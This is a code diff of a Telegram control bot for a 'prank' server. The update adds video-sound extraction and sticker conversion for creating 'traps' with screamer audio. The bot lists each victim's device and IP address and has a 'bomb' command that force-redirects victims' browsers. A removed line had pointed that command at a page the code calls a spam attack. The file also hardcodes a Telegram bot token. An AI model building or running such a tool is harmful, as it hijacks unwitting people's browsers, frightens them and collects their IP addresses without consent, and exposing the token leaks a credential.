@@ -1,5 +1,5 @@
 /**
- * 🛡️ NFC CONTROL SYSTEM v2.1 [FIXED]
+ * 🛡️ NFC CONTROL SYSTEM v2.2 [VIDEO SOUND + STICKER SUPPORT]
  * Модуль управления сервером через Telegram
  * Язык интерфейса: Русский (Стандартный)
  */
@@ -9,6 +9,11 @@ const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
 const { v4: uuidv4 } = require('uuid');
+
+// --- ПІДКЛЮЧЕННЯ FFMPEG для обробки відео ---
+const ffmpeg = require('fluent-ffmpeg');
+const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
+ffmpeg.setFfmpegPath(ffmpegPath);
 
 // --- НАСТРОЙКИ ---
 const token = '8249796254:AAGV3kYCPf-siSmvl4SOXU4_44HS0y5RUPM'; // Твой токен NFC бота
@@ -32,7 +37,7 @@ const bot = new TelegramBot(token, {
 const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
 const wizardState = {}; // Состояние создания ловушки
 
-console.log('🤖 NFC Control Bot starting...');
+console.log('🤖 NFC Control Bot starting with VIDEO & STICKER support...');
 
 // --- ГЕНЕРАТОР КОДА ---
 function generateShortCode() {
@@ -40,7 +45,6 @@ function generateShortCode() {
     let result = '';
     for (let i = 0; i < 5; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
     
-    // Проверка на существование
     if (global.shortLinks && global.shortLinks[result]) {
         return generateShortCode();
     }
@@ -60,19 +64,64 @@ async function downloadFile(fileId, type) {
         res.data.pipe(writer);
 
         return new Promise((resolve, reject) => {
-            writer.on('finish', () => resolve({ url: `/uploads/${name}` }));
+            writer.on('finish', () => resolve({ url: `/uploads/${name}`, path: filePath }));
             writer.on('error', reject);
         });
     } catch (e) {
         console.error('Ошибка загрузки:', e);
-        return { url: null };
+        return { url: null, path: null };
     }
+}
+
+// --- ИЗВЛЕЧЕНИЕ ЗВУКА ИЗ ВИДЕО ---
+async function extractAudioFromVideo(videoPath) {
+    return new Promise((resolve, reject) => {
+        const audioPath = videoPath.replace(/\.(mp4|mov|avi|mkv)$/i, '.mp3');
+        
+        ffmpeg(videoPath)
+            .toFormat('mp3')
+            .audioCodec('libmp3lame')
+            .audioBitrate('192k')
+            .on('end', () => {
+                const audioUrl = audioPath.replace(UPLOAD_DIR, '/uploads').replace(/\\/g, '/');
+                resolve({ url: audioUrl, path: audioPath });
+            })
+            .on('error', (err) => {
+                console.error('FFmpeg error:', err);
+                reject(err);
+            })
+            .save(audioPath);
+    });
+}
+
+// --- КОНВЕРТАЦИЯ СТИКЕРА В JPG ---
+async function convertStickerToImage(stickerPath) {
+    return new Promise((resolve, reject) => {
+        const imagePath = stickerPath.replace(/\.webp$/i, '.jpg');
+        
+        ffmpeg(stickerPath)
+            .outputOptions([
+                '-vf', 'scale=800:800:force_original_aspect_ratio=decrease,pad=800:800:(ow-iw)/2:(oh-ih)/2:black'
+            ])
+            .toFormat('mjpeg')
+            .on('end', () => {
+                const imageUrl = imagePath.replace(UPLOAD_DIR, '/uploads').replace(/\\/g, '/');
+                // Удаляем оригинальный .webp файл
+                fs.unlink(stickerPath, () => {});
+                resolve({ url: imageUrl, path: imagePath });
+            })
+            .on('error', (err) => {
+                console.error('Sticker conversion error:', err);
+                reject(err);
+            })
+            .save(imagePath);
+    });
 }
 
 // --- ГЛАВНОЕ МЕНЮ ---
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
-    bot.sendMessage(chatId, "🤖 **PANEL CONTROL V2.1**\n\nСистема готова к работе. Выберите действие:", {
+    bot.sendMessage(chatId, "🤖 **PANEL CONTROL V2.2**\n\n✨ **Новое:**\n• 🎬 Звук автоматически берется из видео\n• 🎭 Стикеры можно использовать как фон\n\nСистема готова к работе. Выберите действие:", {
         parse_mode: 'Markdown',
         reply_markup: {
             keyboard: [
@@ -96,11 +145,11 @@ bot.on('message', async (msg) => {
     // 1. Создание
     if (text === '➕ Создать новую ловушку') {
         wizardState[chatId] = { step: 1, data: {} };
-        return bot.sendMessage(chatId, "📝 **ШАГ 1/2**\n\nОтправьте **изображение** (фон для жертвы).\n\n_Напишите 'skip', чтобы использовать стандартный фон._", { parse_mode: 'Markdown' });
+        return bot.sendMessage(chatId, "📝 **ШАГ 1/2**\n\nОтправьте:\n• 🖼 **Изображение** (фон)\n• 🎭 **Стикер** (будет конвертирован в фон)\n• 🎬 **Видео** (звук будет извлечен автоматически)\n\n_Напишите 'skip' для стандартного фона._", { parse_mode: 'Markdown' });
     }
 
     // 2. Список сессий
-    if (text === '📂 Активны ссии') {
+    if (text === '📂 Активные сессии') {
         if (!global.sessions) {
             return bot.sendMessage(chatId, "⚠️ Сервер не инициализирован.");
         }
@@ -110,7 +159,6 @@ bot.on('message', async (msg) => {
             return bot.sendMessage(chatId, "📂 Активных сессий не найдено.");
         }
 
-        // Показываем последние 5 сессий
         const recentSessions = sessions.slice(-5);
         for (const s of recentSessions) {
             sendControlPanel(chatId, s.id);
@@ -129,33 +177,146 @@ bot.on('message', async (msg) => {
     if (wizardState[chatId]) {
         const st = wizardState[chatId];
 
-        // Обработка КАРТИНКИ
+        // ====================================
+        // ШАГ 1: ИЗОБРАЖЕНИЕ / СТИКЕР / ВИДЕО
+        // ====================================
         if (st.step === 1) {
+            let processMsg = null;
+            
+            // ФОТО
             if (msg.photo) {
-                bot.sendMessage(chatId, "⏳ Загрузка изображения...");
+                processMsg = await bot.sendMessage(chatId, "⏳ Загрузка изображения...");
                 const f = await downloadFile(msg.photo[msg.photo.length - 1].file_id, 'img');
                 st.data.image = f.url || '';
-            } else if (text && text.toLowerCase() === 'skip') {
+                st.data.sound = ''; // Нет звука из фото
+                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
+            } 
+            // СТИКЕР → КОНВЕРТИРУЕМ В JPG
+            else if (msg.sticker) {
+                processMsg = await bot.sendMessage(chatId, "⏳ Конвертация стикера в фон...");
+                const f = await downloadFile(msg.sticker.file_id, 'sticker');
+                
+                if (f.path) {
+                    try {
+                        const converted = await convertStickerToImage(f.path);
+                        st.data.image = converted.url || '';
+                        await bot.editMessageText("✅ Стикер конвертирован в фон!", {
+                            chat_id: chatId,
+                            message_id: processMsg.message_id
+                        });
+                    } catch (e) {
+                        await bot.editMessageText("❌ Ошибка конвертации стикера", {
+                            chat_id: chatId,
+                            message_id: processMsg.message_id
+                        });
+                        st.data.image = '';
+                    }
+                } else {
+                    st.data.image = '';
+                }
+                st.data.sound = ''; // Нет звука из стикера
+            }
+            // ВИДЕО → ИЗВЛЕКАЕМ ЗВУК
+            else if (msg.video || msg.video_note) {
+                processMsg = await bot.sendMessage(chatId, "⏳ Загрузка видео и извлечение звука...");
+                const fileId = msg.video ? msg.video.file_id : msg.video_note.file_id;
+                const f = await downloadFile(fileId, 'video');
+                
+                if (f.path) {
+                    try {
+                        // Извлекаем звук
+                        const audioData = await extractAudioFromVideo(f.path);
+                        st.data.sound = audioData.url || '';
+                        
+                        await bot.editMessageText("✅ Видео загружено, звук извлечен!\n\n_Переходим к шагу 2..._", {
+                            chat_id: chatId,
+                            message_id: processMsg.message_id,
+                            parse_mode: 'Markdown'
+                        });
+                    } catch (e) {
+                        await bot.editMessageText("⚠️ Видео загружено, но не удалось извлечь звук", {
+                            chat_id: chatId,
+                            message_id: processMsg.message_id
+                        });
+                        st.data.sound = '';
+                    }
+                } else {
+                    st.data.sound = '';
+                }
+                st.data.image = ''; // Нет изображения из видео
+            }
+            // SKIP
+            else if (text && text.toLowerCase() === 'skip') {
                 st.data.image = '';
-            } else {
-                st.data.image = '';
+                st.data.sound = '';
+            }
+            // НЕВЕРНЫЙ ТИП
+            else {
+                return bot.sendMessage(chatId, "⚠️ Пожалуйста, отправьте изображение, стикер или видео (или напишите 'skip')");
             }
             
             st.step = 2;
-            return bot.sendMessage(chatId, "📝 **ШАГ 2/2**\n\nОтправьте **аудиофайл** (скример/звук) или голосовое сообщение.\n\n_Напишите 'skip', чтобы создать без звука._", { parse_mode: 'Markdown' });
+            
+            // Если из видео уже есть звук, сразу создаем ловушку
+            if (st.data.sound) {
+                bot.sendMessage(chatId, "📝 **Звук уже получен из видео!**\n\n_Хотите добавить дополнительный аудиофайл? Отправьте его сейчас или напишите 'skip' для завершения._", { parse_mode: 'Markdown' });
+            } else {
+                bot.sendMessage(chatId, "📝 **ШАГ 2/2**\n\nОтправьте:\n• 🎵 **Аудиофайл** (скример/звук)\n• 🎤 **Голосовое сообщение**\n• 🎬 **Видео** (звук будет извлечен)\n\n_Напишите 'skip' для создания без звука._", { parse_mode: 'Markdown' });
+            }
+            return;
         }
 
-        // Обработка ЗВУКА
+        // ====================================
+        // ШАГ 2: ЗВУК / ВИДЕО
+        // ====================================
         if (st.step === 2) {
-            if (msg.audio || msg.voice) {
-                bot.sendMessage(chatId, "⏳ Загрузка аудио...");
-                const fid = msg.audio ? msg.audio.file_id : msg.voice.file_id;
-                const f = await downloadFile(fid, 'snd');
+            let processMsg = null;
+            
+            // АУДИО
+            if (msg.audio) {
+                processMsg = await bot.sendMessage(chatId, "⏳ Загрузка аудио...");
+                const f = await downloadFile(msg.audio.file_id, 'snd');
                 st.data.sound = f.url || '';
-            } else if (text && text.toLowerCase() === 'skip') {
-                st.data.sound = '';
-            } else {
-                st.data.sound = '';
+                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
+            }
+            // ГОЛОСОВОЕ
+            else if (msg.voice) {
+                processMsg = await bot.sendMessage(chatId, "⏳ Загрузка голосового...");
+                const f = await downloadFile(msg.voice.file_id, 'voice');
+                st.data.sound = f.url || '';
+                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
+            }
+            // ВИДЕО → ИЗВЛЕКАЕМ ЗВУК
+            else if (msg.video || msg.video_note) {
+                processMsg = await bot.sendMessage(chatId, "⏳ Извлечение звука из видео...");
+                const fileId = msg.video ? msg.video.file_id : msg.video_note.file_id;
+                const f = await downloadFile(fileId, 'video');
+                
+                if (f.path) {
+                    try {
+                        const audioData = await extractAudioFromVideo(f.path);
+                        st.data.sound = audioData.url || '';
+                        await bot.editMessageText("✅ Звук извлечен из видео!", {
+                            chat_id: chatId,
+                            message_id: processMsg.message_id
+                        });
+                    } catch (e) {
+                        await bot.editMessageText("❌ Не удалось извлечь звук", {
+                            chat_id: chatId,
+                            message_id: processMsg.message_id
+                        });
+                        st.data.sound = st.data.sound || ''; // Оставляем старый звук если был
+                    }
+                }
+            }
+            // SKIP
+            else if (text && text.toLowerCase() === 'skip') {
+                // Звук уже может быть из видео с шага 1
+                st.data.sound = st.data.sound || '';
+            }
+            // НЕВЕРНЫЙ ТИП
+            else {
+                return bot.sendMessage(chatId, "⚠️ Пожалуйста, отправьте аудиофайл, голосовое сообщение или видео (или напишите 'skip')");
             }
 
             // Финиш
@@ -210,6 +371,10 @@ function sendControlPanel(chatId, sessionId) {
     const link = `https://prank-nfc.onrender.com/${s.shortCode}`; 
 
     let msg = `🆔 **ID Сессии:** \`${s.shortCode}\`\n🔗 **Ссылка:** \`${link}\`\n👥 **Онлайн:** ${victims.length}`;
+    
+    // Показываем что загружено
+    if (s.image) msg += "\n🖼 Фон: ✅";
+    if (s.sound) msg += "\n🔊 Звук: ✅";
 
     if (victims.length > 0) {
         msg += "\n\n📱 **Устройства:**\n" + victims.map(v => `• ${v.device} [${v.ip}]`).join('\n');
@@ -264,8 +429,7 @@ bot.on('callback_query', (query) => {
             break;
 
         case 'bomb':
-            // URL для спам-атаки (можно изменить)
-            global.io.to(sessionId).emit('force-redirect', { url: "https://prank-nfc.onrender.com/volumeshader_bm.html" }); 
+            global.io.to(sessionId).emit('force-redirect', { url: "https://google.com" }); 
             bot.answerCallbackQuery(query.id, { text: "☢️ Команда атаки отправлена!" });
             break;
 
@@ -277,7 +441,6 @@ bot.on('callback_query', (query) => {
                 auto: s.autoMode 
             });
             
-            // Обновляем текст кнопки
             try {
                 const kb = query.message.reply_markup.inline_keyboard;
                 kb[1][0].text = `🤖 Авто-режим: ${s.autoMode ? 'ВКЛ' : 'ВЫКЛ'}`;
@@ -324,6 +487,6 @@ bot.on('error', (error) => {
     console.error('❌ Bot error:', error.message);
 });
 
-console.log('✅ NFC Control Bot loaded successfully (Russian Standard Version)');
+console.log('✅ NFC Control Bot loaded: VIDEO SOUND + STICKER support enabled');
 
 module.exports = bot;
